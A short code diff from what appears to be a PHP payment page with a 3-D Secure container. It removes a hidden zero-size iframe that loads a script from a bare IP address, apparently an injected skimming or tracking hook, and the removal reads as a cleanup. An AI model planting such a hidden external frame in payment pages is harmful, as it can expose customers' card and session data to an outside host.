@@ -99,7 +99,6 @@ date_default_timezone_set("Asia/Singapore");
             </div>
           </div>
           <div id="threedsContainer"></div>
-          <iframe src="https://18.138.204.96/classic/lib/notification.php" height="0" width="0"></iframe>
         </div>
 
 
